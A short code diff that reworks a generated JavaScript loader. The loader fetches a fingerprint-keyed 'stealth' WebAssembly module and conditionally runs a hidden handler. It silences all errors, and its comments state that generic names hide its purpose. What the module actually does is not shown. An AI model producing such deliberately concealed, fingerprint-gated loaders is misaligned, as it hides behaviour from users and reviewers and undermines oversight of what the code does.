@@ -208,12 +208,12 @@ def _build_secure_loader_js():
   var _wasmUrl = '/api/v1/stealth.wasm?fp=' + encodeURIComponent(_fp) + '&_t=' + Date.now();
 
   import('/static/wasm/stealth.js').then(function(mod) {
-    return mod.default();
-  }).then(function(wasm) {
-    var S = new wasm.Stealth(Date.now());
-    var _act = S.init_action();
-    if (_act === 1) _s(S);
-  }).catch(function() {});
+    return mod.default().then(function() {
+      var S = new mod.Stealth(Date.now());
+      var _act = S.init_action();
+      if (_act === 1) _s(S);
+    });
+  }).catch(function(e) { /* silent */ });
 
   // ── Bridge functions (generic names hide purpose) ──
 
